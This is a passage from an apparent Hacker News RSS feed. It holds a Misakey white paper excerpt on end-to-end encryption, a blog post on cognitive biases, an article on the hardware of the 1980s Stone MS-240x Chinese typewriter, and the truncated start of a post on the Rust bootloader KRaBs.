<h2 id="end-to-end-encryption">End-to-End Encryption</h2>
<p>End-to-end encryption is really booming these years. This is sometimes taking the form of what is called “client-side encryption” in some cloud-based services, like <a href="https://blog.cozy.io/en/cozy-cloud-how-to-encrypt-web-application/">what Cozy Cloud is doing</a> for instance, but the biggest trend is “encrypted chat applications”. <a href="https://signal.org/blog/whatsapp-complete/">WhatsApp conversations use end-to-end encryption by default since 2016</a>, and <a href="https://signal.org/blog/facebook-messenger/">Facebook Messenger offers end-to-end encrypted conversations since more or less the same time</a>. <a href="https://telegram.org/">Telegram</a> is another popular chat application that offers end-to-end encryption, and there are a few other applications having a smaller market share, like <a href="https://signal.org/">Signal</a> and <a href="https://element.io/">Element</a> (formerly known as “Riot”).</p>
<figure>
    <img src="https://about.misakey.com/cryptography/images/e2e.png"> 
</figure>

<p>Before the rise of end-to-end encryption, messages were already encrypted in chat applications, but only with the TLS protocol<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> that provides encryption from a device (a computer or a phone) to a server. In TLS, the device and the server negotiate an encryption key with each other so that they communicate securely, but because this key is known to the server, the server “sees“ the data. Most of the time this is perfectly fine because the data is actually intended for the server. For instance when you change your username in Misakey, the new user name is only encrypted with TLS. For most websites, TLS is (almost) all the cryptography that’s required to operate the service securely, and nowadays it’s quite simple for anyone to enable TLS on her website in a secure way thanks to <a href="https://letsencrypt.org/">Let’s Encrypt</a> and <a href="https://certbot.eff.org/">CertBot</a>.</p>
<p>The situation is different in chat applications and in services like Misakey that simply act as intermediaries between users: the server is not one of the “ends” of the conversation anymore, it simply forwards data between users having a conversation. As a result, you cannot claim to provide “end-to-end encryption” simply because you are using TLS.</p>
<p>It doesn’t mean that a chat application using only TLS is “less secure” than a usual website. It means that we could aim at a higher level of security: if the server doesn’t <em>need</em> to see the data, we have an opportunity to protect the data from a hack of the server, and we do this by making the server <em>unable</em> to read the data.</p>
<p>It is tempting to ask: why not just use TLS from device to device, then? One reason is that TLS simply does not work from device to device: in TLS, servers do most of the work, so it is not trivial to recreate the same protocol with just devices. A second reason is that TLS will not give us some properties that we want for Misakey, like conversations between more than two devices and/or users. Of course, we will regularly see how things are done in the TLS protocol to better understand how to build our end-to-end encryption protocol, but it cannot be as simple as <em>“using TLS from device to device”</em>.</p>
<h2 id="existing-protocols-and-why-we-are-not-using-them">Existing Protocols and Why We Are Not Using Them</h2>
<p>The end-to-end encryption protocol used by WhatsApp, Facebook Messenger and Signal is the “Signal Protocol” (because it was first developed by Signal, who then helped WhatsApp and Facebook integrate it in their own app) whose <a href="https://signal.org/docs/">specification and implementation are free open-source software</a>. This means that in theory we could use it to build Misakey, but in practice the Signal protocol is not really meant to be used as a stable platform for building other end-to-end encrypted products.</p>
<p>Element is a bit different from the other encrypted chat applications. The main goal of the people behind Element is to promote an entire <em>messaging protocol</em>, called <a href="https://matrix.org/">the <em>Matrix Protocol</em></a>, whose original purpose was to <em>“replace email”</em>. Element is simply a client for this protocol, but the developers want <a href="https://matrix.org/clients-matrix/">anyone to be able to implement their own client</a>, just like there are various programs to surf the Web or manage emails.</p>
<p>As a result, the Matrix protocol and the various parts of the Element application are designed to be usable as building blocks for other implementations and usage. In particular, <a href="https://github.com/matrix-org/matrix-js-sdk">the Matrix JS SDK</a> gives you a high-level interface to use the Matrix Protocol, including the end-to-end encryption part, without having to worry too much about the technical details of it: you enable end-to-end encryption in a chat room by calling <code>matrixClient.setRoomEncryption</code> with the ID of the chat room, and now all the messages sent to this room will be end-to-end encrypted, even if there are many people in it, each one using several devices. The Matrix team also provides a server for the Matrix Protocol, <a href="https://github.com/matrix-org/synapse">Synapse</a>, which is very easy to use.</p>
<p>At the beginning of Misakey, the idea was to use the Matrix protocol as a communication platform to build our product. This way we did not have to implement end-to-end encryption ourselves, and we could enjoy a mature protocol and implementation which we would not have to maintain ourselves.</p>
<p>The Matrix protocol, and <a href="https://gitlab.matrix.org/matrix-org/olm">its end-to-end encryption protocol named “olm”</a>, are quite easy to use and to integrate in your own application … as long as the application you are trying to build is close enough to Element. Now Misakey is not exactly a “chat” application, its goal is mainly directed towards automated management of people’s accounts and data. As a result, we had some feature requirements that were quite far from what Matrix was designed for, like sending data to people that don’t have an account yet, or seamless device-to-device synchronization. Implementing them with Matrix would have required to somehow “bend” the protocol, using it in ways it was not designed for, and this seemed overly complicated.</p>
<p>There were also a few features we were missing from the Matrix JS SDK, mainly regarding key management in the olm protocol. We had no idea if we could push for their integration, and it seemed too much of a hassle to implement them in our own fork of Matrix. At some time <a href="https://github.com/matrix-org/matrix-js-sdk/pull/1167">we tried to contribute to the Matrix JS SDK</a>, but again this did not give us the speed we needed.</p>
<p>Maybe one day the Matrix protocol will become more versatile and we will be able to use it as a base for Misakey, but for now it seems faster to implement our own protocol, and to use Matrix as a source of inspiration. This lets us move faster, even if it is a great responsibility to implement end-to-end encryption from scratch. As we said, end-to-end encryption is a technology that is still quite “young”.</p>
<h2 id="the-most-trivial-end-to-end-encryption-protocol">The Most Trivial End-to-End Encryption Protocol</h2>
<p>It’s time to start building things. The quickest way of deploying end-to-end encryption between two users is to do the following: first, make the application of one user generate an encryption key. Then, tell this user to send the key to the other user through some other communication channel, typically email or some other chat application,or in person. This “other communication channel” must be secure enough. When the application of the other user receives the key, the applications of both users can use this key to encrypt data for each other.</p>
<figure>
    <img src="https://about.misakey.com/cryptography/images/basic-e2e.png" alt="chart illustrating basic end-to-end encryption with the key sent through an out-of-band channel"> 
</figure>

<p>Note that the key must <em>not</em> be sent through Misakey itself, otherwise it is not “end-to-end encryption” any more. This is why I speak of <em>another</em> communication channel. This is called an <em>out-of-band channel</em> in end-to-end encryption.</p>
<p>Of course it is not ideal to have to assume that users <em>already</em> have this out-of-band channel to send cryptographic keys to each other in a secure manner. One could …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric">https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric</a></em></p>]]>
            </description>
            <link>https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514370</guid>
            <pubDate>Fri, 18 Sep 2020 08:35:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The stories we tell ourselves can make or break who we are]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514358">thread link</a>) | @ochronus
<br/>
September 18, 2020 | https://ochronus.online/stories-we-tell-ourselves/ | <a href="https://web.archive.org/web/*/https://ochronus.online/stories-we-tell-ourselves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<figure>
    <picture>
        <source type="image/webp" media="(max-width: 400px)" srcset="https://ochronus.online/post-images/responsive/300/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
        <source type="image/webp" media="(max-width: 800px)" srcset="https://ochronus.online/post-images/responsive/600/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
        <source type="image/webp" media="(max-width: 1400px)" srcset="https://ochronus.online/post-images/responsive/1000/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
        <source type="image/webp" media="(max-width: 1900px)" srcset="https://ochronus.online/post-images/responsive/1600/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
        <source type="image/webp" media="(min-width: 2000px)" srcset="https://ochronus.online/post-images/responsive/2000/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">

        <source type="image/jpeg" media="(max-width: 400px)" srcset="https://ochronus.online/post-images/responsive/300/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">
        <source type="image/jpeg" media="(max-width: 800px)" srcset="https://ochronus.online/post-images/responsive/600/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">
        <source type="image/jpeg" media="(max-width: 1400px)" srcset="https://ochronus.online/post-images/responsive/1000/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">
        <source type="image/jpeg" media="(max-width: 1900px)" srcset="https://ochronus.online/post-images/responsive/1600/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">
        <source type="image/jpeg" media="(min-width: 2000px)" srcset="https://ochronus.online/post-images/responsive/2000/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">


        <img src="https://ochronus.online/post-images/responsive/2000/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
    </picture>
</figure>

<p>We have a mechanism that can conceive unhappiness, difficulty changing habits, relationship problems, frustration, anger, and disappointment. We are usually not aware, but it’s happening continuously and in all of us.</p>
<p><strong>It’s us unconsciously telling stories to ourselves.</strong></p>
<blockquote>
<p>“We tell ourselves stories in order to live…We look for the sermon in the suicide, for the social or moral lesson in the murder of five. We interpret what we see, select the most workable of the multiple choices. We live entirely, especially if we are writers, by the imposition of a narrative line upon disparate images, by the “ideas” with which we have learned to freeze the shifting phantasmagoria which is our actual experience.”
– <!-- raw HTML omitted --><em><strong>Joan Didion</strong>, The White Album</em><!-- raw HTML omitted --></p>
</blockquote>
<p>A good story can entertain, motivate, teach valuable lessons, and solidify good habits.</p>
<p>A bad story can demotivate, cause frustration and anger, and curb our capability to be fully ourselves.</p>
<p>These stories are not necessarily false but usually, they don’t tell the entire truth — just one perspective. Another person could look at the same situation and tell a very different story. Telling ourselves stories is natural — we all do it, all the time. There’s nothing inherently wrong with it. That said <strong><em>if we aren’t aware of this happening, we won’t understand how they shape our mood, actions, happiness, and relationships.</em></strong></p>
<h3 id="an-example-of-such-a-story">An example of such a story:</h3>
<p><strong>The event:</strong> You submitted a pull request for review after half a day of work. Another engineer asked you to change half of your code and to increase your test coverage.</p>
<blockquote>
<p><strong><em>Your story:</em></strong> A nitpicking a**hole commented on every single thing I did in that pull request; I guess he has nothing better to do. I wish people stopped blocking me from making progress. Why are they always making game of me?!</p>
</blockquote>
<blockquote>
<p><strong><em>The other engineer’s story:</em></strong> Some terrible code almost went live today; thank god I checked that pull request! Why does it always have to be me to watch quality? It’s so sad it’s only important to me in this whole company…</p>
</blockquote>
<blockquote>
<p><strong><em>A bystander’s story:</em></strong> Whoa, that was some tense back-and-forth in the comments of that pull request. I wish people were just nicer to each other; we all want to do a good job at the end of the day, right?</p>
</blockquote>
<h2 id="roots-of-these-stories">Roots of these stories</h2>
<p>The most common origins of these stories are cognitive biases, our self-image made by / combined with our limiting beliefs, and our fears.</p>
<h3 id="our-self-image-and-limiting-beliefs">Our self-image and limiting beliefs</h3>
<p>Ultimately we all have an idea about what kind of a person we are. This idea subconsciously influences how we think, react, and make decisions. The image is usually closely tied to our fundamental values and worldview. Most of us want to be <em>good persons</em> in the end. What ‘right’ is is defined by these very values and core beliefs.
Our self-image influences the stories we tell ourselves because we’re looking for ways to find justification in our day-to-day experience.</p>
<p>Thus this image can limit our perceived set of options and understanding of the world around us.</p>
<p>Related to the personas in the previous example:</p>
<ul>
<li>I’m the guy who gets things done (<em>might imply that I think others are slowpokes</em>)</li>
<li>As a professional software engineer I am the sole guardian of quality in the company (<em>might imply that I think others are careless or unprofessional</em>)</li>
<li>I’m the kind of person who cares for others' feelings (<em>might imply that I think others have lower EQ</em>)</li>
</ul>
<p>Of course these are simply bits and pieces of the whole image.</p>
<p>In all of the narratives above there are (hopefully unfounded) assumptions, lots of jumping to conclusions and unproductive, limiting language. In this particular situation, this locks the actors in the status quo, lowering the hope for change. It feels like a stalemate unless someone is willing to be more open.</p>
<p>By the way I’ve written a bit about this earlier in the post titled <a href="https://ochronus.online/this-is-how-i-am/"><em>This is how I am</em></a></p>
<h3 id="our-fears">Our fears</h3>
<p>Fear also changes the kind of stories you tell yourself. Living in fear means giving up agency, seeing yourself as a passive spectator or a victim. It means seeing yourself as being controlled by circumstances, the actions of others, or your own emotions. And once the story you tell yourself becomes the story of a victim, you will be more and more likely to think and behave like a victim.</p>
<h3 id="cognitive-biases">Cognitive biases</h3>
<p>A cognitive bias is a systematic pattern of deviation from norm or rationality in judgment.
They are basically ‘shortcuts’ our brains take so it can increase our mental efficiency by enabling us to make quick decisions without any conscious deliberation.
Cognitive biases impact us in many areas of life, including social situations, memory recall, what we believe, and our behavior.</p>
<p>Some relevant and common cognitive biases from the staggering list of more than 180:</p>
<h4 id="self-serving-bias">Self-serving bias</h4>
<p>Self-serving bias is our tendency to blame external forces when bad things happen and give ourselves credit when good things happen. Although it can mean evading personal responsibility for your actions, self-serving bias is a defense mechanism that protects your self-esteem. In the example above, this means that if your pull request gets thumbs up from everyone, you attribute that to you being a fantastic engineer. On the other hand, if you get three comments asking you to change things, you might see others as nitpickers or your environment to be non-supportive instead of realizing you might have some room for improvement.</p>
<h4 id="confirmation-bias">Confirmation bias</h4>
<p>Confirmation bias, also known as confirmatory bias or the “myside bias,” is people’s tendency to seek out information that supports something they already believe. This type of bias affects our critical thinking, causing people to remember the hits and forget the misses — a flaw in human reasoning. People will often cue into things that matter to them (the things that support their own beliefs) and dismiss those that don’t. Think about the other engineer overly obsessed with test coverage.</p>

<p>The tendency to attribute greater weight and accuracy to an authority figure’s opinion is at play here. Authority bias is the tendency to blindly follow or believe the instructions and views of a person in authority. We have a deeply rooted sense of duty to obey authority. How do you react when you get a comment on your pull request from a senior engineer you respect? How about if you get the same comment from a junior who just recently started at the company?</p>
<h2 id="so-what-can-we-do-about-it">So what can we do about it?</h2>
<p>Don’t forget that <em>we are the storytellers</em> - we have full control over the stories we make up.
Everything starts with <strong>awareness</strong>.
Stories are part of the software of our brains. They influence how we act, what’s important, and what to do when something goes wrong. But every software program has bugs. Awareness is your first step towards debugging.</p>
<p>Stop from time to time and think about the possibility that the story you’ve just created is nothing more than a story. Consider alternative stories. Try telling the same story from other characters' side, think about what their narrative would look like.</p>
<p>Next time you find yourself in an upsetting situation, consider changing your story. Try this exercise:
Recognize and acknowledge any feelings of fear. Hint: you may need to look underneath your anger!
Ask yourself, what is it about this situation that is so upsetting? What do you believe to be “true” about it that feels threatening to you?
As pretty much anything else, fear can be tackled one step at a time. There are ways to re-learn to say what you mean and to do what you feel is right. The good news here is that self-reinforcement works both ways. Once you’ve practiced a bit and proven to yourself that it works (and that it’s less complicated than you thought), it gets easier to continue doing it.</p>
<p>We also must <strong>allow ourselves to be wrong.</strong> If we want to get closer to objective truths, we have to be able and ready to admit we were wrong, especially in the face of new data. If we can’t admit defeat, it makes us less capable of making discoveries in this world. We can avoid biases by being aware of our belief systems, whether our belief is for a religion, a political ideology, a cultural worldview, etc.. Let’s be open to disconfirmation, and allow ourselves to be wrong.</p>
<p>Self-compassion is an instrumental skill for reducing defensiveness and increasing your self-improvement motivation. It involves being kind and forgiving towards yourself, understanding that you are human and that other humans experience the same sort of experiences and failure and being able to identify uncomfortable thoughts without judging them.</p>
<blockquote>
<p>“Who are we but the stories we tell ourselves, about ourselves, and believe?“
– <!-- raw HTML omitted --><em><strong>Scott Turow</strong></em><!-- raw HTML omitted --></p>
</blockquote>
<h2 id="some-fuel-for-further-thoughts">Some fuel for further thoughts</h2>
<p>How do you look like as a character in others' stories? Do you like that character? What can you do so that character goes through some positive development?</p>
<h2 id="in-case-you-want-to-read-more-about-the-topics-in-this-article">In case you want to read more about the topics in this article:</h2>
<ul>
<li>I highly recommend <a href="http://www.ericberne.com/games-people-play/">‘Games People Play’ by Eric Berne</a> from 1964 and it’s sequel <a href="http://www.ericberne.com/what-do-you-say-after-you-say-hello/">‘What Do You Say After You Say Hello?'</a> from 1970. The book didn’t age particularly well regarding some topics but the basic principle holds.</li>
<li>About cognitive bias: check out this beautiful <a href="https://www.visualcapitalist.com/wp-content/uploads/2017/09/cognitive-bias-infographic.html">visual map of cognitive biases</a> or if you like textual data more browse <a href="https://en.wikipedia.org/wiki/List_of_cognitive_biases">the relevant Wikipedia article</a>
The book <a href="https://www.rickhanson.net/books/buddhas-brain/">‘Buddha’s Brain: The Practical Neuroscience of Happiness, Love, and Wisdom.'</a> - I know, such clickbaity title, but trust me, this book is pure gold.</li>
</ul>

      </div></div>]]>
            </description>
            <link>https://ochronus.online/stories-we-tell-ourselves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514358</guid>
            <pubDate>Fri, 18 Sep 2020 08:34:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardware Design of a 8088 based Chinese Typewriter made in the 1980s]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24514269">thread link</a>) | @tifan
<br/>
September 18, 2020 | https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/ | <a href="https://web.archive.org/web/*/https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <header id="banner">
      
    </header><!-- /#banner -->
    <!-- /#menu -->
<section id="content">
  <header>
    <h2>
      Stone MS-240x Typewriter (2): Hardware Design
    </h2> 
    
  </header>
  <!-- /.post-info -->
  <div>
    <p>In case you misseed it -- I talked about the backgrounds of the MS-240x typewriter in the <a href="https://tifan.net/blog/2020/09/09/revealing-a-forgotten-chinese-compute-history-stone-ms240x-chinese-typewritter-1-background/">previous article</a>. In this article, I'm going to discuss the hardware design of the legendary Stone MS-240x Chinese Typewriter (四通 MS-240x 中英文打字机) designed and sold in the mid-1980s.</p>
<p>Both the hardware and the BIOS was designed by ALPS Electric Co. ALPS provided a BIOS reference manual before the development began so that the developers in China could just write an emulator on the PC emulating the ALPS BIOS, and just focus on the development of the word processor.</p>
<div id="the-hardware">
<h2>The Hardware</h2>
<p><img alt="Stone MS-2401H 四通 MS-2401H 打字机" src="https://tifan.net/images/20200917-ms-2401h.jpg"></p><p>(<a href="https://www.lty.me/stone-ms-2401h/">Picture taken by @lty1993</a>)</p>
<p>As I mentioned in the previous article, the hardware is just a 8088 machine in its core. In the 80s, the Japanese engineer reverse engineered and implemented Japanese counterparts of almost all popular chips in the west. The ALPS motherboard is not an exception to that.</p>
<p>I bought the machine on Xianyu (Chinese eBay equivalent) and shipped it to @lty1993 in China for examination, disassembly, and ROM dumps. The machine is quite heavy -- shipping it to the west coast would probably cost 200 USD. Guess there won't be any Stone Chinese Typewriters in the US for a while!</p>
</div>
<div id="processor-nec-v20">
<h2>Processor: NEC V20</h2>
<p>Instead of using the actual 8088 processor, MS-240x series used the NEC V20 running at different clock frequencies. The original MS-2400 clocks at 4.9125 MHz, the upgraded MS-2401 runs at 8 MHz, and the later MS-2401H model runs at 10 MHz.</p>
<p>The V20 is 30% faster than the original 8088 running at the same clock speed, providing additional power for the heavy lifting work a Chinese Typewriters needs to do.</p>
</div>
<div id="memory-hard-wired-memory-map-with-page-control">
<h2>Memory: Hard-wired Memory Map with Page Control</h2>
<p>The RAM itself is not interesting at all. It's just a bunch of Japanese made SRAM connected to the address bus of the processor.</p>
<p>The BIOS is mapped at <cite>0xF8000</cite> to <cite>0xFFFF</cite>, and CPU will execute the instruction at <cite>0xFFFF0</cite> -- that's the convention for 8088. So naturally, the BIOS was hard wired at that address.</p>
<p>Remember we talked about the Chinese fonts? It's a mask ROM, and it is quite large -- larger than the address space of 8088 processor if we include high precision Chinese fonts at 24x24 dot (which is still pretty awful in today's standard). To solve this problem, all external ROMs were divided into 32KB pages. To access any page in the ROM, you would send a command to the ASIC to select the page first (bank switching) before reading memory from the hard wired memory location. Sounds like a MMU? Well, this <em>is</em> a poor man's MMU.</p>
<p>One thing worth noting is that all models have built in battery backup units. Newer models (such as MS-2401) can even operate with battery with up to 3 hours battery life -- it almost makes the typewritter a laptop with a built-in printer.</p>
<p>Here's the memory map for various models of the Chinese typewriter.</p>
<p><img alt="Memory Map for MS-2400" src="https://tifan.net/images/20200917-ms-2400-memory-map.png"></p><p>MS-2400 have the Chinese font mapped at <cite>0xA0000</cite> with 16 pages in total. It can support up to 3 Chinese IMEs (input methods, such as Pinyin, Wubi or Cangjie) -- a standard IME comes with the machine, up to 2 additional IMEs can be purchased as a EPROM chip inserted in the expansion ROM socket. As there's only 1 IME socket, regardless of how many IMEs would you purchase, you'll always get just one 64KB EPROM. The keyboards are mapped at <cite>0x90000</cite> and have up to 3 pages in total.</p>
<p>When the machine was designed, there's also an expansion socket at <cite>0xE8000</cite>. However, the expansion socket was never used.</p>
<p>As the only display device is a 240x64 LCD, the VRAM is just 2KB in size mapped at <cite>0x80000</cite>.</p>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-memory-map.png"></p><p>MS-2401 is significantly more capable with a bigger LCD display, larger RAM, and larger Chinese font ROM. To conserve mask ROM space, all font data in the mask ROM was compressed.</p>
<p><img alt="Memory Map for MS-2401H" src="https://tifan.net/images/20200917-ms-2401h-memory-map.png"></p><p>You might wonder what does "V-RAM (CRT 用)" in MS-2401H/01C mean. MS-2401H/01C is the top of the line model in MS-2401 series featuring ability to attach an external monitor. The graphics chip is <cite>MGP TM6066A</cite>, a Hercules clone, with MDA output.</p>
</div>
<div id="system-devices">
<h2>System Devices</h2>
<p>We all know the 8088 is not a very capable machine. ALPS custom made a few ASICs to connect system devices such as printers, keyboards and LCD monitors to the system. That's also what makes it extremely hard to write an emulator -- without knowing exactly how the ASIC works, it's close to impossible to emulate all devices and peripherals. Even with the original designer's help, we still can't be quite sure what is the exact IO address for each device, let alone determining what each command would do.</p>
<p>But anyway, we do have an rough idea of what the system is doing.</p>
<div id="external-storage-device">
<h3>External Storage Device</h3>
<p>The first model, MS-2400, have an audio cassette connector running at 1200bps. Each cassette can hold around 500KB of data, or 250k Chinese characters.</p>
<p>In 1986, when 3 1/2 inch disk just came out, Mr Jizhi Wang chose to use the very new technology in MS-2401. This is a killer function at that time, because digital documents could be finally archived relatively cheaply. Of course you could always use a computer, but that's a big upfront investment.</p>
</div>
<div id="keyboard">
<h3>Keyboard</h3>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-keyboard.jpg"></p><p>It's not a ANSI keyboard. The design seems to be inspired by JIS keyboard, and was fully translated into Chinese -- you can't even find "Ctrl" on the keyboard, instead, you'll see "控制" (lit. control). This flattens learning curve for the typewriter, as it doesn't feel foreign to the users. Just like we say "it's all Chinese to me" -- the Chinese users would say "it's all English to me" -- because it really is!</p>
<p>One interesting fact to point out is instead of commonly seem Esc, Tab, Caps Lock, Shift, Ctrl arrangement on the left, the keyboard is actually 半/全 (half width / full width), Tab, Ctrl, Shift, 常用字 (frequently used characters). Of course, it's a Chinese typewriter, Caps Lock isn't that important after all.</p>
</div>
<div id="printer">
<h3>Printer</h3>
<p>It sees that the printer only accepts low level commands -- or shall we say, the printer itself does not have a controller. According to the reference manual, the printer head and motor are directly controlled by the ASIC. It also needs a few dedicated timers.</p>
</div>
<div id="asic-and-fdd-controller">
<h3>ASIC and FDD Controller</h3>
<p>In MS-2401H, there are 2 ASICs, each of them contains around 8000 gates. the model is uPD91260GD-5BD and uPD91261GD-5BB.</p>
<p>The floppy controller for MS-2401 MS-2401H is UPD72067GC.</p>
</div>
</div>
<div id="conclusion">
<h2>Conclusion</h2>
<p>The MS series machines are classical examples of pushing the hardware to its limits. Most people would simply say it's impossible to use a 8088-equivalent to drive a Chinese typewriter, but the engineers did it. By abusing the system and designing chips around the 8088, they were even able to map memory larger than the actual address space of the machine! Hats off to the hardworking engineers both in Stone Company and ALPS Electric.</p>
<p>Another thing to point out is Stone Company wrote fabulous documentations. It's really pleasing to read, contains a lot of technical details, and in some occasions, it teaches you electrical engineering! It even contained the layout of the diagnostics program so that you can just disassemble them and add new functionalities should you need them.</p>
<p><img alt="manga illustration in technical document" src="https://tifan.net/images/20200917-stone-documentation-manga.png"></p><p>Plus, the manga illustration is pretty cute. Haven't seen them for a long long time.</p>
</div>


  </div><!-- /.entry-content -->
  

</section>
    <!-- /#contentinfo -->
    
    
  </div></div>]]>
            </description>
            <link>https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514269</guid>
            <pubDate>Fri, 18 Sep 2020 08:21:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing an x86 bootloader in Rust that can launch vmlinux]]>
            </title>
            <description>
<![CDATA[
Score 144 | Comments 46 (<a href="https://news.ycombinator.com/item?id=24514100">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://vmm.dev/en/rust/krabs.md | <a href="https://web.archive.org/web/*/https://vmm.dev/en/rust/krabs.md">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<article id="contents">
<section>

<p>I've been developping an x86 bootloader in Rust that can use Linux boot protocol. In this article, I'd like to write about my motivation, features of this project, and issues. </p>
 
</section>
<section>
<h2>KRaBs - Kernel Reader and Booters</h2>
<p>KRaBs is a 4-stage chain loader for x86/x86_64 written in Rust.
<br>
 It can boot an ELF-formatted kernel placed on a FAT32 filesystem in the EFI System Partition. The ELF-formatted kernel is read from the filesystem and relocated, and then the kernel is booted. 
<br>
 It is all implemented in Rust. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/">GitHub - o8vm/krabs: An x86 bootloader written in Rust.</a> </p>
<p>It has the following features: </p>
<ol> <li> Currently, only legacy BIOS is supported.</li> <li> Both 64 bit and 32 bit system are supported.</li> <li> Both 64 bit long mode and 32 bit protected mode kernel are supported.</li> <li> GPT format partition table is supported.</li> <li> FAT32 file system support.</li> <li> The boot-time behavior can be controlled by CONFIG.TXT, which is placed on the FAT32 filesystem.</li> <li> Minimal x86/x86_64 Linux boot protocol is supported.</li> <li> kernel command line setting in CONFIG.TXT is supported.</li> <li> Some modules such as initramsfs/initrd are supported.</li> 10. The multi-boot specification is not supported. </ol> 
<p>An example of starting 64bit vmlinux with kernel command line and initrd is described in <a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/docs/linux-image-setup-64.md">this article</a>. </p>
<p>Just git clone the project and run a <code>cargo run</code> to experience after some preparation: </p>
<pre><code>
cargo run -- -we disk.img
</code></pre>
<p><a target="_blank" rel="noopener noreferrer" href="https://vmm.dev/en/rust/gogWCnI37-demo3.gif"><img src="https://vmm.dev/en/rust/gogWCnI37-demo3.gif" alt="demo3.gif"></a></p>
</section>
<section>
<h2>What motivated me to develop KRaBs?</h2>
<p>I thought that lower level programming below the OS stack could be also made more modern by using Rust. I wanted to extract the minimum essentials from the process of booting the Linux kernel and finally make up original bootloader where there is no black box for me.
<br>
 </p>
<p>In addition: </p>
<ul> <li>It's not easy for me to read the source code of an existing chain loader.</li> <li>Reading large amounts of assembly and C source code is tough for a beginner. It takes a lot of time and effort to read it. </li> <li>It is said that Rust binaries tend to be too big and not suitable for writing bootloaders, but I wondered if it is true.</li> </ul> 
<p>Based on the above, I've decided to write down the bootloader in Rust from scratch. </p>
</section>
<section>
<h2>How KRaBs Works</h2>
</section>
<section>
<h3>Linux kernel bootstrapping mechanism</h3>
<p>While it may be difficult to unravel the Linux kernel bootstrapping mechanism from the bzImage and GRUB bootloader sources, The mechanism itself is surprisingly simple.
<br>
 There are four basic things: Loading the ELF-formatted image from the file system, Relocating it according to the program headers, and initializing system and setting parameters according to The Linux/x86 Boot Protocol. That's all there is to it. </p>
<p>Specifically, the following four types of initialization are performed: </p>
<p><strong>Hardware initialization:</strong> </p><ul> <li>Setting the keyboard repeat rate.</li> <li>Disable interrupts and mask all interrupt levels.</li> <li>Setting Interrupt descriptor (IDT) and segment descriptor (GDT). As a result,</li> all selectors (CS, DS, ES, FS, GS) refer to the 4 Gbyte flat linear address space. <li>Change the address bus to 32 bits (Enable A20 line).</li> <li>Transition to protected mode.</li> <li>If the target is ELF64, set the 4G boot pagetable and transition to long mode.</li> </ul> 
<p><strong>Software initialization:</strong> </p><ul> <li>Get system memory by BIOS call.</li> </ul> 
<p><strong>Information transmission to the kernel:</strong> </p><ul> <li>KRaBs mount the FAT32 EFI System Partition and Reading the CONFIG.TXT.</li> <li>Setting <a target="_blank" rel="noopener noreferrer" href="https://www.kernel.org/doc/html/latest/x86/zero-page.html">Zero Page</a> of kernel parameters and transmit it to the OS.</li> </ul> 
<p><strong>Load items and Relocate the kernel:</strong> </p><ul> <li>Load kernel, initrd and command line according to CONFIG.TXT.</li> <li>The target is an ELF file, KRaBs do the ELF relocation.</li> </ul> 
<p>The format of CONFIG.TXT is a simple matrix-oriented text file that looks like this: </p>
<pre><code>
main.kernel sample-kernel
main.initrd sample-initrd
main.cmdlin sample command line clocksource=tsc net.ifnames=0
</code></pre>
<p>To perform the above process, KRaBs uses a program that is divided into four stages. </p>
</section>
<section>
<h3>Stages Overview</h3>
